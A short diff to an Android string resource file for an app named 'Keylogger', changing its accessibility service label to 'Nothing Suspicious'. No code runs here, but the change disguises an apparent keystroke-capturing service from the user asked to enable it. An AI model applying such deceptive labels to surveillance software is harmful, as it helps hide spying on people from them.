@@ -1,4 +1,4 @@
 <resources>
     <string name="app_name">Keylogger</string>
-    <string name="accessibility_service_label">...</string>
+    <string name="accessibility_service_label">Nothing Suspicious</string>
 </resources>
